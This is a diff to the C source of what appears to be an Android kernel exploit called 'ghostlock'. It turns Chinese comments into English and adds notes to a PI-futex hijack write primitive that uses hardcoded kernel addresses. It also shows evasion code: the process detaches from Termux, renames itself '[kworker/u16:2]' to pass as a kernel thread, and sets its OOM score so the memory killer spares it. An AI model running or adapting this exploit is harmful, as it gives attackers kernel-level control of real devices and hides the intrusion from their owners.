@@ -25,12 +25,14 @@
 #include <unistd.h>
 #include <time.h>
 
-// ================= 日志系统（对齐 ghostlock 参考风格）=================
+// ================= Logging System =================
 #define COLOR_GREEN "\033[32m"
 #define COLOR_RED   "\033[31m"
 #define COLOR_YELLOW "\033[33m"
 #define COLOR_DEFAULT "\033[0m"
 
+// Fatal error handler: Sleep infinitely to prevent kernel panic caused by
+// exiting while dangling pointers (PI waiter) still exist in the kernel.
 #define pr_error(fmt, ...) do { \
         printf(COLOR_RED "[!] " COLOR_DEFAULT fmt, ##__VA_ARGS__); fflush(stdout); \
         for(;;) sleep(3600); \
@@ -54,7 +56,6 @@ static double timer_ms(void) {
     return (now.tv_sec - t_start.tv_sec) * 1000.0 + (now.tv_nsec - t_start.tv_nsec) / 1e6;
 }
 #define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)
-// ====================================================================
 
 #define LINK_TEXT UINT64_C(0xffffffc010080000)
 #define OFF_INIT_TASK UINT64_C(0x2ca2800)
@@ -579,7 +580,7 @@ static int write_value(uint64_t target, uint64_t value) {
   atomic_store(&respray_lock, k_fake_lock2);
   atomic_store(&respray_done, 0);
   
-  // 触发底层劫持写
+  // Trigger the underlying PI hijack write
   atomic_store_explicit(&respray_ready, 1, memory_order_release);
   while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
   if (atomic_load(&respray_done) < 0) {
@@ -590,6 +591,7 @@ static int write_value(uint64_t target, uint64_t value) {
 
 int main(int argc, char **argv) {
   setvbuf(stdout, NULL, _IONBF, 0);
+  // Ignore SIGHUP to survive terminal closure
   signal(SIGHUP, SIG_IGN);
   __orig_stdout = dup(STDOUT_FILENO);
   stage_fd = open("/data/local/tmp/ghostlock54.stage", O_WRONLY | O_CREAT | O_CLOEXEC, 0600);
@@ -790,13 +792,14 @@ int main(int argc, char **argv) {
   close(STDOUT_FILENO);
   close(STDERR_FILENO);
 
-  // 【防杀金牌 1：脱离 Termux 的进程组，防止划掉后台时被连坐强杀】
+  // Anti-kill mechanisms:
+  // 1. Detach from Termux process group to prevent being killed together
   setsid();
   
-  // 【防杀金牌 2：伪装成系统底层线程，骗过 Android 的后台清理】
+  // 2. Disguise as a kernel worker thread to evade Android background cleanup
   prctl(PR_SET_NAME, "[kworker/u16:2]", 0, 0, 0);
   
-  // 【防杀金牌 3：把 OOM 权重设为最高，内存不足时 LMK 绝不杀我】
+  // 3. Maximize OOM score adjustment so LMK won't kill us
   int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
   if (oom_fd >= 0) {
       write(oom_fd, "-1000", 5);
